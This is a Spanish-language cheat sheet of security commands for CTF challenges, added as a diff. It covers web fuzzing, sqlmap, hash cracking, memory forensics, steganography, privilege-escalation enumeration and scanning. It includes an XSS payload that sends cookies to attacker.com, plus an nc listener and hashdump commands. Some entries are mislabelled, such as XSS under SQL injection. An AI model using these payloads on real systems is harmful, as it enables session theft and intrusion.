@@ -1,0 +1,296 @@
+[⌘] CTF Cheat Sheet - Linux Cheat Sheet
+[1] Web Exploitation
+    ⌘ Fuzzer
+        gobuster dir -u http://target.com -w /path/to/wordlist.txt.........................................: Búsqueda de directorios web
+        dirb http://target-com /path/to/wordlist.txt.......................................................: Búsqueda de directorios web
+        ffuf -u http://target-com/FUZZ -w wordlist.txt.....................................................: Fuzzing web rápido
+        nikto -h http://target-com.........................................................................: Escaneo de vulnerabilidades web
+        sqlmap -u "http://target.com/page?id=1" --dbs......................................................: Listar bases de datos
+        sqlmap -u "http://target.com/page" --data="id=1" --dbs.............................................: Enviar datos POST
+
+    ⌘ SQL Injection
+        sqlmap -u "http://target.com/page" --data="id=1" -D database --tables..............................: Listar tablas
+        <script>alert(1)</script>..........................................................................: Prueba básica de XSS
+        <script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>........................: Robo de cookies
+
+[2] Binary Exploitation (PWN)
+    ⌘ Herramientas
+        gdb................................................................................................: GNU Debugger
+        pwndbg.............................................................................................: Plugin mejorado para GDB
+        pwntools...........................................................................................: Biblioteca Python para exploits
+        checksec...........................................................................................: Ver protecciones del binario
+        ROPgadget..........................................................................................: Buscador de gadgets ROP
+
+        checksec ./binary..................................................................................: Ver protecciones del binario
+        gdb ./binary.......................................................................................: Iniciar depuración
+        pattern create 100.................................................................................: Crear patrón para calcular offset
+        pattern offset $eip................................................................................: Calcular offset del EIP
+
+[3] Cryptography
+    ⌘ Hashing
+        hash-identifier....................................................................................: Identificar tipo de hash
+        hashcat -m 0 hash.txt rockyou.txt..................................................................: Crackear hash MD5
+        john --format=raw-md5 hash.txt.....................................................................: Crackear con John the Ripper
+
+    ⌘ RSA
+        openssl rsautl -decrypt -inkey private.pem -in encrypted.bin -out flag.txt.........................: Desencriptar con clave privada
+        openssl rsautl -encrypt -inkey public.pem -pubin -in flag.txt -out encrypted.bin...................: Encriptar con clave pública
+
+    ⌘ Base64
+        base64.............................................................................................: Codificar a base64
+        base64 -d..........................................................................................: Decodificar base64
+        echo -n "texto" | base64...........................................................................: Codificar a base64
+        echo -n "dGV4dG8=" | base64 -d.....................................................................: Decodificar base64
+
+[4] Forensics
+    ⌘ File Analysis
+        file file.bin......................................................................................: Determinar tipo de archivo
+        strings file.bin...................................................................................: Extraer cadenas de texto
+        strings -n 8 file.bin..............................................................................: Extraer cadenas con mínimo 8 caracteres
+        binwalk file.bin...................................................................................: Analizar archivos binarios
+        binwalk -e file.bin................................................................................: Extraer archivos incrustados
+        foremost -i file.bin -o output_dir.................................................................: Extraer archivos de una imagen
+        exiftool image.jpg.................................................................................: Ver metadatos de una imagen
+        exiv2 image.jpg....................................................................................: Ver y modificar metadatos EXIF
+        fls -f ext4 -r -p /dev/sda1........................................................................: Listar archivos en sistema de archivos
+        icat -f ext4 /dev/sda1 inode.......................................................................: Extraer archivo por inode
+
+    ⌘ PCAP Analysis
+        tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri........................: Extraer URLs HTTP
+        tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name..........................................: Extraer consultas DNS
+        tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.arg -e ftp.response.arg...................: Analizar tráfico FTP
+        tshark -r capture.pcap -Y "icmp" -T fields -e ip.src -e ip.dst -e icmp.type........................: Filtrar tráfico ICMP
+        tshark -r capture.pcap -qz io,phs..................................................................: Estadísticas de protocolos
+        tcpdump -r capture.pcap -n 'tcp[13] = 18'..........................................................: Buscar paquetes SYN-ACK
+        tcpdump -r capture.pcap -A 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'.......: Extraer peticiones POST
+        tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.user_agent.................: Extraer User-Agents HTTP
+        tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name......................: Mostrar solo consultas DNS (sin respuestas)
+        tshark -r capture.pcap -Y "http.request.method == \"POST\"" -T json................................: Extraer peticiones POST en JSON
+        tshark -r capture.pcap -Y "tcp.analysis.retransmission" -T fields -e ip.src -e tcp.srcport.........: Detectar retransmisiones TCP
+        tshark -r capture.pcap -Y "http contains \"password\"" -T fields -e http.host -e http.request.uri..: Buscar contraseñas en tráfico HTTP
+        tshark -r capture.pcap -Y "smb || nbns || dcerpc || nbss || dns"...................................: Filtrar tráfico SMB/NBNS
+
+    ⌘ Memory Analysis
+        volatility -f memory.dmp imageinfo.................................................................: Obtener información de la imagen de memoria
+        volatility -f memory.dmp --profile=Win7SP1x64 pslist...............................................: Listar procesos en memoria
+        volatility -f memory.dmp --profile=Win7SP1x64 cmdline..............................................: Ver líneas de comando de procesos
+        volatility -f memory.dmp --profile=Win7SP1x64 filescan | grep -i password..........................: Buscar archivos de contraseñas
+        volatility -f memory.dmp --profile=Win7SP1x64 hashdump.............................................: Extraer hashes de contraseñas
+        volatility -f memory.dmp --profile=Win7SP1x64 iehistory............................................: Historial de Internet Explorer
+        volatility -f memory.dmp --profile=Win7SP1x64 clipboard............................................: Ver contenido del portapapeles
+
+    ⌘ Esteganografía Avanzada
+        steghide extract -sf file.jpg......................................................................: Extraer archivo oculto (con contraseña)
+        stegsnow -C file.txt...............................................................................: Ocultar mensaje en espacios en blanco
+        stegolsb wavsteg -i audio.wav -s secret.txt -o output.wav -n 1.....................................: Ocultar en archivo WAV
+        stegolsb wavsteg -r -i output.wav -o secret.txt -n 1 -b 1000.......................................: Extraer de archivo WAV
+        stegoveritas file.jpg..............................................................................: Análisis completo de esteganografía
+        stegdetect -t jpg image.jpg........................................................................: Detectar esteganografía en JPG
+        stegbreak -t o -f wordlist.txt image.jpg...........................................................: Ataque de diccionario a esteganografía
+
+[5] Reverse Engineering
+    ⌘ Herramientas
+        Ghidra.............................................................................................: Herramienta de ingeniería inversa gratuita
+        IDA Pro............................................................................................: Desensamblador y depurador
+        radare2............................................................................................: Framework de ingeniería inversa
+        Cutter.............................................................................................: Interfaz gráfica para radare2
+
+    ⌘ Comandos Básicos
+        r2 -d ./binary.....................................................................................: Depurar binario con radare2
+        aaa................................................................................................: Analizar todo en radare2
+        afl................................................................................................: Listar funciones en radare2
+        pdf @main..........................................................................................: Desensamblar función main en radare2
+
+[6] Esteganografía
+    ⌘ Herramientas Básicas
+        steghide extract -sf imagen.jpg....................................................................: Extraer archivos ocultos de una imagen
+        binwalk -e archivo.................................................................................: Extraer archivos ocultos
+        stegsolve.jar......................................................................................: Analizar imágenes para esteganografía
+        zsteg -a image.png.................................................................................: Detectar datos ocultos en PNG/BMP
+
+[7] Escalada de Privilegios
+    ⌘ Linux
+        sudo -l............................................................................................: Ver comandos permitidos con sudo
+        find / -perm -u=s -type f 2>/dev/null..............................................................: Buscar binarios SUID
+        uname -a...........................................................................................: Ver información del sistema
+        id.................................................................................................: Ver usuario y grupos actuales
+        cat /etc/passwd....................................................................................: Listar usuarios del sistema
+
+    ⌘ Windows
+        whoami /priv.......................................................................................: Ver privilegios
+        systeminfo.........................................................................................: Ver información del sistema
+        net user...........................................................................................: Listar usuarios
+        net localgroup administrators......................................................................: Listar administradores
+
+[8] Red
+    ⌘ Escaneo de Puertos
+        nmap -sV -sC -p- -T4 target........................................................................: Escaneo completo de puertos y servicios
+        masscan -p1-65535 --rate=1000 target...............................................................: Escaneo rápido de puertos
+        rustscan -a target -- -A...........................................................................: Escaneo rápido con RustScan
+
+    ⌘ Web Proxies
+        Burp Suite.........................................................................................: Suite completa para pruebas de seguridad web
+        OWASP ZAP..........................................................................................: Herramienta de pruebas de seguridad web
+        mitmproxy..........................................................................................: Proxy HTTP interactivo
+
+    ⌘ Análisis de Red
+        wireshark..........................................................................................: Herramienta gráfica de análisis de red
+        tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri................: Filtrar peticiones HTTP
+        tcpdump -r capture.pcap -n 'tcp port 80'...........................................................: Filtrar tráfico HTTP
+
+    [9] Password Cracking
+    ⌘ John the Ripper
+        john --wordlist=rockyou.txt hash.txt...............................................................: Crackear hash con diccionario
+        john --format=NT hash.txt..........................................................................: Especificar formato de hash NT
+
+    ⌘ Hashcat
+        hashcat -m 0 hash.txt rockyou.txt..................................................................: Crackear hash MD5
+        hashcat -m 1000 hash.txt -a 3 ?l?l?l?l?l...........................................................: Ataque de fuerza bruta (5 letras minúsculas)
+
+[10] One-liners Avanzados
+    ⌘ Búsquedas con Find y Grep
+        find /path -type f -exec grep -l "pattern" {} \;...................................................: Buscar archivos que contengan patrón
+        find /path -type f -name "*.txt" -exec grep -i "password" {} \;....................................: Buscar contraseñas en archivos .txt
+        find /path -type f -exec file {} \; | grep "text"..................................................: Encontrar archivos de texto
+        grep -r "pattern" /path 2>/dev/null................................................................: Búsqueda recursiva silenciosa
+        find /path -type f -size +1M -exec ls -lh {} \;....................................................: Encontrar archivos >1MB
+        find / -type f -perm -4000 -exec ls -la {} 2>/dev/null \;..........................................: Encontrar binarios SUID
+
+    ⌘ Procesamiento de Texto Avanzado
+        cat file.txt | tr -d '\r' > newfile.txt............................................................: Eliminar retornos de carro (DOS a UNIX)
+        sed 's/foo/bar/g' file.txt.........................................................................: Reemplazar texto en archivo
+        sed -i 's/^/PREFIX /' file.txt.....................................................................: Agregar prefijo al inicio de cada línea
+        sed -n '10,20p' file.txt...........................................................................: Extraer líneas 10 a 20
+        awk '{print $1,$3}' file.txt.......................................................................: Imprimir columnas específicas
+        awk '!seen[$0]++' file.txt.........................................................................: Eliminar líneas duplicadas
+        awk -F: '{print $1 ":" $3}' /etc/passwd............................................................: Extraer usuarios y UIDs
+        sort file.txt | uniq -c | sort -nr.................................................................: Contar y ordenar ocurrencias
+        grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' file.txt | sort -u...................................: Extraer IPs únicas
+        grep -oP '(?<=user=)[^&]*' access.log..............................................................: Extraer valores de parámetros URL
+        tr '[:upper:]' '[:lower:]' < file.txt > output.txt.................................................: Convertir a minúsculas
+        tr -d '\0' < binary.file > clean.file..............................................................: Eliminar caracteres nulos
+        cut -d: -f1,3 /etc/passwd | sort -t: -n -k2........................................................: Ordenar por UID numérico
+        paste -d, file1.txt file2.txt > combined.csv.......................................................: Combinar archivos columna por columna
+        column -t -s, data.csv.............................................................................: Formatear CSV para mejor visualización
+
+    ⌘ Red y Conexiones
+        for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip | grep "bytes from" | cut -d" " -f4 | cut -d":" -f1 & done....: Ping sweep
+        nc -nlvp 4444......................................................................................: Escuchar conexión entrante
+        python3 -m http.server 8000........................................................................: Iniciar servidor web temporal
+        tcpdump -i eth0 -n -s0 -w capture.pcap.............................................................: Capturar tráfico de red
+        tshark -i eth0 -Y "dns" -T fields -e dns.qry.name..................................................: Monitorear consultas DNS
+        nmap -sV -sC -p- -T4 192.168.1.1...................................................................: Escaneo completo de puertos
+
+    ⌘ Extracción y Análisis de Datos
+        strings file.bin | grep -i flag....................................................................: Buscar banderas en archivos binarios
+        xxd file.bin | less................................................................................: Ver archivo en hexadecimal
+        hexdump -C file.bin | less.........................................................................: Ver archivo en hexadecimal con ASCII
+        file file.bin......................................................................................: Determinar tipo de archivo
+        binwalk -e file.bin................................................................................: Extraer archivos incrustados
+        foremost -i file.bin -o output_dir.................................................................: Recuperar archivos eliminados
+
+    ⌘ Análisis de Imágenes y Archivos
+        exiftool image.jpg.................................................................................: Ver metadatos de imagen
+        exiv2 -p a image.jpg...............................................................................: Mostrar todos los metadatos Exif
+        steghide extract -sf image.jpg.....................................................................: Extraer archivo oculto
+        steghide info image.jpg............................................................................: Ver información de archivo oculto
+        stegsolve.jar image.jpg............................................................................: Analizar esteganografía
+        zsteg -a image.png.................................................................................: Detectar datos ocultos en PNG
+        zsteg -E "b1,rgb,lsb,xy" image.png > hidden_data...................................................: Extraer datos LSB
+        stegoveritas image.jpg.............................................................................: Análisis forense avanzado
+        stegoveritas -imageRot -trailing -colorMap image.jpg...............................................: Análisis de mapa de colores
+        pngcheck -v image.png..............................................................................: Verificar integridad de PNG
+        pngcrush -check file.png...........................................................................: Verificar y reparar PNG
+        binwalk -e file.jpg................................................................................: Extraer archivos incrustados
+        foremost -i file.jpg -o output_dir.................................................................: Recuperar archivos eliminados
+        jsteg reveal image.jpg.............................................................................: Extraer datos ocultos con JSteg
+        stegpy -p password image.jpg.......................................................................: Extraer datos con contraseña
+        stegdetect -t jpg image.jpg........................................................................: Detectar esteganografía en JPG
+        stegbreak -t o -f wordlist.txt image.jpg...........................................................: Ataque de diccionario a esteganografía
+        stegsnow -C -p password hidden.txt.................................................................: Ocultar mensaje en espacios en blanco
+        stegsnow -C -p password -f hidden.txt output.txt...................................................: Extraer mensaje oculto
+        outguess -k "secret" -d hidden.txt image.jpg output.jpg............................................: Ocultar datos con OutGuess
+        outguess -k "secret" -r output.jpg extracted.txt...................................................: Extraer datos con OutGuess
+
+    ⌘ Comandos Avanzados con XARGS y Paralelización
+        find /path -type f -print0 | xargs -0 grep -l "pattern"............................................: Búsqueda segura con espacios
+        cat urls.txt | xargs -P 10 -I {} wget -q {}........................................................: Descargar múltiples URLs en paralelo
+        find /path -name "*.txt" -print0 | xargs -0 rm.....................................................: Eliminar archivos de forma segura
+        ps aux | grep process | grep -v grep | awk '{print $2}' | xargs kill -9............................: Matar procesos por nombre
+        find /path -type f -name "*.log" -print0 | xargs -0 ls -la.........................................: Listar archivos con espacios
+        cat hashes.txt | xargs -I{} sh -c "echo -n {}: && echo {}" | md5sum................................: Procesar hashes en lote
+        find /path -type f -name "*.log" -print0 | xargs -0 -P 4 grep -H "error"...........................: Búsqueda paralela en múltiples archivos
+        ls *.jpg | parallel -j 4 convert {} -resize 800x800 resized_{}.....................................: Redimensionar imágenes en paralelo
+        cat domains.txt | parallel -j 10 "host {} | grep 'has address' | cut -d' ' -f4"....................: Resolución DNS masiva en paralelo
+        find /path -type f -name "*.gz" -print0 | parallel -0 -j 4 "gunzip -c {} > {/.}"...................: Descomprimir archivos en paralelo
+        seq 1 100 | parallel -j 10 "curl -s 'http://example.com/api/{}' | jq '.data'"......................: Hacer peticiones HTTP en paralelo
+        find /path -type f -name "*.csv" -print0 | parallel -0 -X cat > combined.csv.......................: Combinar múltiples archivos CSV
+
+    ⌘ Notas Importantes
+        ls -la.............................................................................................: Ver permisos de archivos
+        ps aux.............................................................................................: Ver procesos en ejecución
+        netstat -tulpn.....................................................................................: Ver conexiones de red
+        crontab -l.........................................................................................: Ver tareas programadas
+        env................................................................................................: Ver variables de entorno
+
+    ⌘ Herramientas Recomendadas
+        gdb-peda...........................................................................................: Plugin de GDB para análisis de binarios
+        pwntools...........................................................................................: Biblioteca Python para desarrollo de exploits
+        python3-pip........................................................................................: Gestor de paquetes de Python
+        git................................................................................................: Control de versiones
+        tmux / screen......................................................................................: Multiplexores de terminal
+        vim / nano.........................................................................................: Editores de texto en terminal
+        wget / curl........................................................................................: Herramientas para descargar archivos
+        python3-venv.......................................................................................: Entornos virtuales de Python
+        seclists...........................................................................................: Colección de listas de palabras
+        gobuster...........................................................................................: Herramienta de fuerza bruta de directorios
+        ffuf...............................................................................................: Fuzzer web rápido
+        exiftool...........................................................................................: Ver y editar metadatos de archivos
+        steghide...........................................................................................: Ocultar y extraer datos en archivos
+        zsteg..............................................................................................: Detectar datos ocultos en imágenes
+        volatility.........................................................................................: Análisis de memoria forense
+
+[5] Comandos de Sistema Útiles
+    ⌘ Información del Sistema
+        cat /etc/issue.....................................................................................: Mostrar versión del SO
+        cat /proc/cpuinfo..................................................................................: Ver información detallada del CPU
+        lscpu..............................................................................................: Ver información resumida del CPU
+        free -h............................................................................................: Ver uso de memoria y swap
+        df -h..............................................................................................: Ver espacio en disco
+        du -sh *...........................................................................................: Ver tamaño de archivos/directorios
+        uname -a...........................................................................................: Ver información del kernel
+        who................................................................................................: Ver usuarios conectados
+        w..................................................................................................: Ver usuarios y procesos activos
+        last...............................................................................................: Ver historial de inicios de sesión
+        ps aux.............................................................................................: Ver todos los procesos
+        top/htop...........................................................................................: Monitor de procesos en tiempo real
+
+    ⌘ Red y Conexiones
+        ifconfig/ip a......................................................................................: Ver interfaces de red
+        netstat -tulpn.....................................................................................: Ver puertos en escucha
+        ss -tulpn..........................................................................................: Alternativa a netstat
+        lsof -i............................................................................................: Ver conexiones y puertos abiertos
+        ping <host>........................................................................................: Verificar conectividad
+        traceroute <host>..................................................................................: Rastrear ruta de paquetes
+        dig <domain>.......................................................................................: Consultas DNS
+        nslookup <domain>..................................................................................: Consultas DNS (alternativa)
+        whois <domain>.....................................................................................: Información de dominio
+        wget <url>.........................................................................................: Descargar archivos
+        curl -I <url>......................................................................................: Ver solo encabezados HTTP
+        ssh user@host......................................................................................: Conexión SSH
+        scp file user@host:path............................................................................: Copiar archivos por SSH
+
+    ⌘ Procesamiento de Texto
+        cat archivo | sort | uniq -c | sort -nr............................................................: Contar y ordenar ocurrencias
+        awk '{print $1}' archivo...........................................................................: Extraer primera columna
+        sed 's/buscar/reemplazar/g' archivo................................................................: Reemplazar texto
+        cut -d':' -f1 /etc/passwd..........................................................................: Extraer usuarios del sistema
+        tr '[:lower:]' '[:upper:]' < archivo...............................................................: Convertir a mayúsculas
+        tr ' ' '\n' < archivo | sort | uniq -c | sort -nr..................................................: Contar palabras únicas
+
+    ⌘ Referencias Rápidas
+        GTFOBins (https://gtfobins.github.io/).............................................................: Binarios para escalar privilegios
+        PayloadsAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings).........................: Colección de payloads
+        HackTricks (https://book.hacktricks.xyz/)..........................................................: Guías de hacking
+        OWASP Testing Guide (https://owasp.org/www-project-web-security-testing-guide/)....................: Guía de pruebas de seguridad web
+        Exploit Database (https://www.exploit-db.com/).....................................................: Base de datos de exploits
